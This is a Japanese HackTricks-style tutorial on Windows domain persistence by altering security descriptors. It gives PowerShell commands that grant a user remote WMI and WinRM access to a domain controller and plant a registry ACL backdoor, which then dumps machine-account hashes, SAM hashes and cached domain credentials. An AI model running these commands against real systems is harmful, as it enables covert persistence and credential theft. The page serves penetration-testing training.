# セキュリティ記述子

{{#include ../../banners/hacktricks-training.md}}

## セキュリティ記述子

[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) は、セキュリティ記述子を記述するために使用されるフォーマットを定義します。SDDL は DACL と SACL のために ACE 文字列を使用します: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

**セキュリティ記述子**は、**オブジェクト**が**オブジェクト**に対して**持つ** **権限**を**保存**するために使用されます。オブジェクトの**セキュリティ記述子**に**少しの変更**を加えることができれば、特権グループのメンバーである必要なく、そのオブジェクトに対して非常に興味深い権限を取得できます。

この永続性技術は、特定のオブジェクトに対して必要なすべての権限を獲得する能力に基づいており、通常は管理者権限を必要とするタスクを、管理者である必要なく実行できるようにします。

### WMI へのアクセス

ユーザーに**リモート WMI を実行する**アクセスを与えることができます [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### WinRMへのアクセス

**ユーザーにwinrm PSコンソールへのアクセスを提供する** [**これを使用して**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### ハッシュへのリモートアクセス

**レジストリ**にアクセスし、**ハッシュをダンプ**して**Regバックドアを作成する**ことで、いつでも**コンピュータのハッシュ**、**SAM**、およびコンピュータ内の任意の**キャッシュされたAD**資格情報を取得できます。したがって、これは**ドメインコントローラコンピュータに対して通常のユーザーにこの権限を与える**のに非常に便利です：
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
[**シルバー チケット**](silver-ticket.md)を確認して、ドメイン コントローラーのコンピュータ アカウントのハッシュをどのように使用できるかを学んでください。

{{#include ../../banners/hacktricks-training.md}}
